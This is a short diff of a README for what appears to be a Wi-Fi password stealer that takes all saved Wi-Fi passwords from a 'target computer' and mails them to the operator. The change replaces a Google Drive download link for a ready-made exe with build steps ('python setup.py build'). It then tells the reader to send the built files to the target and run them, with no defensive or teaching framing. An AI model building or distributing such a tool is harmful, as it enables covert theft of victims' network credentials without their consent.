@@ -3,9 +3,11 @@ Get All Registered Wifi Passwords from Target Computer.
 
 ## EXE FILE
 
-**https://drive.google.com/open?id=1uCdDR673_W1n-SUoB78I_bYJgFr8WJB1**
+```
+python setup.py build
 
-Download and run exe file on Target Computer.The data will mail in 5-10 seconds.
+```
+Send the all files to your target in "dist" Folder.And run exe.
 
 ![github-small](/images/mail2.png)
 
